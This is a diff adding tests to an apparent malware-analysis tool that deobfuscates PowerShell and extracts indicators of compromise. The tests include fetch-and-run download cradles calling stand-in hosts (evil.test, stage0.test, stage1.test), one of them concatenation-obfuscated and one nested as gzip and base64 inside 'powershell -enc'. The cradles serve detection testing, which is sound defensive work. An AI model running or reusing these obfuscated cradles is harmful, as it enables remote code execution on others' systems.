@@ -51,6 +51,19 @@ describe('analyze — end to end (depth 1)', () => {
 })
 
 describe('analyze — deobfuscation (Phase 2a)', () => {
+  async function gzipB64(text: string): Promise<string> {
+    const cs = new CompressionStream('gzip')
+    const bytes = new Uint8Array(await new Response(new Blob([new TextEncoder().encode(text)]).stream().pipeThrough(cs)).arrayBuffer())
+    let bin = ''; for (const b of bytes) bin += String.fromCharCode(b)
+    return btoa(bin)
+  }
+  function encB64(text: string): string {
+    const bytes = new Uint8Array(text.length * 2)
+    for (let i = 0; i < text.length; i++) { bytes[i * 2] = text.charCodeAt(i) & 0xff; bytes[i * 2 + 1] = (text.charCodeAt(i) >> 8) & 0xff }
+    let bin = ''; for (const b of bytes) bin += String.fromCharCode(b)
+    return btoa(bin)
+  }
+
   it('resolves a concatenation-obfuscated cradle and extracts its IOC', async () => {
     const r = await analyze("$u = 'http://ev'+'il.test'+'/a.ps1' ; IEX (New-Object Net.WebClient).DownloadString($u)")
     expect(r.iocs.map((i) => i.raw)).toContain('http://evil.test/a.ps1')
@@ -59,5 +72,18 @@ describe('analyze — deobfuscation (Phase 2a)', () => {
     // must return (not hang); assertion is simply that it resolves
     const r = await analyze("$x = 'IEX $x' ; IEX $x")
     expect(r).toBeDefined()
+  })
+
+  it('extracts IOCs from every decode layer, not just the last (dual-stage)', async () => {
+    const inner = "IEX (New-Object Net.WebClient).DownloadString('http://stage1.test/y')"
+    const gz = await gzipB64(inner)
+    const outer = `iwr http://stage0.test/x ; IEX ([IO.StreamReader](New-Object IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('${gz}'),1))).ReadToEnd()`
+    const r = await analyze(`powershell -enc ${encB64(outer)}`)
+    const raws = r.iocs.map((i) => i.raw)
+    expect(raws).toContain('http://stage0.test/x') // layer-1 (-enc) IOC — was lost before the fix
+    expect(raws).toContain('http://stage1.test/y') // layer-2 (inflate) IOC
+    // layerIndex points at the true AnalysisResult.layers entry
+    expect(r.iocs.find((i) => i.raw === 'http://stage0.test/x')?.layerIndex).toBe(0)
+    expect(r.iocs.find((i) => i.raw === 'http://stage1.test/y')?.layerIndex).toBe(1)
   })
 })
